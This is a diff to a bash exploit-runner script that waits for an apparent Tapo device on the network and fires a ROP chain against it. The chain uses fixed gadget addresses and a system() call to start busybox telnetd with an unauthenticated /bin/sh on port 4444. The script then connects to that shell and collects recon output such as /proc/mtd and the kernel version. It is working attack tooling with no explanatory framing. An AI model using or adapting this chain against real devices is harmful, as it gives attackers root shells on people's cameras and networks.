@@ -88,29 +88,24 @@ while :; do
     # route via the gateway fixes it; an existing one makes `route add` print "File exists", which
     # is not an error. The route is per-boot, so it is re-asserted, never assumed.
     $ROUTE_CMD -host "$ip" "$GW" >/dev/null 2>&1 || true
-    # the index is per host and survives the process: clear it or the next batch resumes
-    # past its own length and fires nothing
-    mkdir -p /tmp/pane1 && echo 0 >"/tmp/pane1/brute.$ip.idx"
-    log "present at $ip — batch from $(printf 0x%x "$ADDR")"
+    # C660 chain is non-PIE ROP from the offline BCL1 decode — fixed .text addresses,
+    # no stack sweep. telnetd (not nc -e) so the listener survives past one connection.
+    log "present at $ip — ROP fire (pop 0x24462 pivot 0x28514e system 0x15928, telnetd)"
     before=$(wc -l <"$LOG" 2>/dev/null || echo 0)
-    sudo -n /opt/homebrew/bin/python3 "$HARNESS" brute --host "$ip" --offset "$PC_OFFSET" --sled 0 --padpc 1 \
-      --sledfill --pcround 0x1000 --addr "$ADDR" --count "$BATCH" --step "$STEP" \
-      --hang --mac "$MAC" >>"$LOG" 2>&1
+    sudo -n /opt/homebrew/bin/python3 "$HERE/tapo_connectap_rop.py" "$ip" \
+      --offset 1060 --pop 0x24462 --pivot 0x28514e --system 0x15928 \
+      --cmd '/bin/busybox telnetd -l /bin/sh -p 4444 &' >>"$LOG" 2>&1
     rc=$?
-    # only this batch's lines: an old HANG line must not end a later walk
-    if tail -n "+$(( before + 1 ))" "$LOG" 2>/dev/null | grep -qE '^(HANG at|SHELL on)'; then
+    sleep 5
+    if timeout 6 bash -c "exec 3<>/dev/tcp/$ip/4444" 2>/dev/null; then
+      mkdir -p "/tmp/pane1/$ip"
+      (printf 'id\n'; sleep 2; printf 'cat /proc/mtd\n'; sleep 2; printf 'cat /proc/version\n'; sleep 2) | \
+        timeout 12 nc "$ip" 4444 >"/tmp/pane1/$ip/recon_telnetd.txt" 2>/dev/null
+      log "FOUND — telnetd up on $ip:4444, recon $(wc -c <"/tmp/pane1/$ip/recon_telnetd.txt" 2>/dev/null) bytes at /tmp/pane1/$ip/recon_telnetd.txt"
       phase DONE
-      log "FOUND — next: nc $ip 4444; tapo_post.py $ip --pull; find_chain.py <pulled main>"
       exit 0
     fi
-    ADDR=$(printf 0x%x $(( ADDR - BATCH * STEP )))
-    echo "$ADDR" >"$ADDR_FILE"
-    if [ $(( ADDR )) -le $(( END )) ]; then
-      phase EXHAUSTED
-      log "range exhausted at $ADDR (rc=$rc) — re-read the region analysis before another walk"
-      exit 1
-    fi
-    log "batch done rc=$rc — resuming at $ADDR"
+    log "ROP fired rc=$rc but 4444 not open — will retry on next presence"
     phase WAITING
     continue
   fi
